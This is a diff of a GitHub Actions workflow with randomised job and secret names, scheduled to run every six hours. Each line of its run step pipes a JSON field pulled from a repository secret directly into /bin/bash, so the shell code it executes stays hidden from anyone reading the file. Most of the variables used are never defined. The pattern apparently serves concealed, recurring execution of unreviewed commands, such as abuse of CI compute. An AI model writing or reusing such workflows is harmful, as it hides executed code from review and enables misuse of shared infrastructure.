@@ -2,9 +2,8 @@ name: guoshantui4678
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 2/6 * * *'
-
-jobs:  # 12613
+    - cron: '33 5/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +11,13 @@ jobs:  # 12613
       - uses: actions/checkout@v4
       - name: guoshantui4678
         env:
-          bm6: ${{ secrets.bm6 }}
+          lsbgf96: ${{ secrets.lsbgf96 }}
         run: |
-          echo $bm6 | jq -r .i383 | /bin/bash
-          echo $te3 | jq -r .bua76089 | /bin/bash
-          echo $xlawt78805 | jq -r .d50 | /bin/bash
-          echo $xbmtr19611 | jq -r .k936 | /bin/bash
-          echo $d89 | jq -r .qd42 | /bin/bash
-          echo $oev384 | jq -r .i21 | /bin/bash
-          echo $tt627 | jq -r .vw956 | /bin/bash
+          echo $lsbgf96 | jq -r .uzjt8717 | /bin/bash
+          echo $ksexy3 | jq -r .ky49 | /bin/bash
+          echo $vz7647 | jq -r .hsd0588 | /bin/bash
+          echo $yougp1 | jq -r .ik2438 | /bin/bash
+          echo $l37733 | jq -r .krl8 | /bin/bash
+          echo $zbh98 | jq -r .byu1862 | /bin/bash
+          echo $v8 | jq -r .ghl682 | /bin/bash
 
